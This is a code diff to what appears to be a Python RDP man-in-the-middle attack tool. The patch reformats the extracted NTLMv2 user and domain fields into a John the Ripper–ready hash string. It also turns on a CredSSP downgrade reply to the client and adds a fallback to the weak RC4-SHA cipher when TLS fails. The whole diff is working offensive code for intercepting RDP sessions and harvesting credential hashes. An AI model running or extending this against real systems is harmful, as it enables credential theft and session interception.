@@ -49,6 +49,7 @@ parser.add_argument('target_port', type=int, default=3389, nargs='?',
 
 args = parser.parse_args()
 
+SSL_CIPHERS = None
 
 TERM_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
     "n": [ 0x3d, 0x3a, 0x5e, 0xbd, 0x72, 0x43, 0x3e, 0xc9, 0x4d, 0xbb, 0xc1,
@@ -149,8 +150,8 @@ def extract_ntlmv2(bytes, m):
         server_challenge = b"SERVER_CHALLENGE_MISSING"
 
     return b"%s::%s:%s:%s:%s" % (
-                 values["user"],
-                 values["domain"],
+                 values["user"].decode('utf-16').encode(),
+                 values["domain"].decode('utf-16').encode(),
                  hexlify(server_challenge),
                  hexlify(nt_response),
                  hexlify(jtr_string),
@@ -709,9 +710,11 @@ def enableSSL():
             keyfile=args.keyfile,
             certfile=args.certfile,
         )
-        remote_socket = ssl.wrap_socket(remote_socket)
+        remote_socket = ssl.wrap_socket(remote_socket, ciphers=SSL_CIPHERS)
     except (ConnectionResetError):
-        print("The client has disconnected")
+        print("Connection lost")
+    except (ssl.SSLEOFError):
+        print("SSL EOF Error during handshake")
 
 
 def close():
@@ -744,15 +747,12 @@ def forward_data():
         except ssl.SSLError as e:
             if "alert access denied" in str(e):
                 print("TLS alert access denied, Downgrading CredSSP")
-                #  local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
-                data = b"300da003020104a4060204c000005e"
-                to_socket.send(data)
+                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
                 return False
             elif "alert internal error" in str(e):
-                print("TLS alert internal error, ...")
-                data = b"300da003020104a4060204c000005e"
-                #  to_socket.send(data)
-                to_socket.close()
+                print("TLS alert internal error received, trying RC4-SHA")
+                global SSL_CIPHERS
+                SSL_CIPHERS = "RC4-SHA"
                 return False
             else:
                 raise
@@ -787,7 +787,7 @@ def run():
         except (ssl.SSLError, ssl.SSLEOFError) as e:
             print("SSLError: %s" % str(e))
         except (ConnectionResetError, OSError):
-            print("The client has disconnected")
+            print("Connection lost")
 
 
 local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
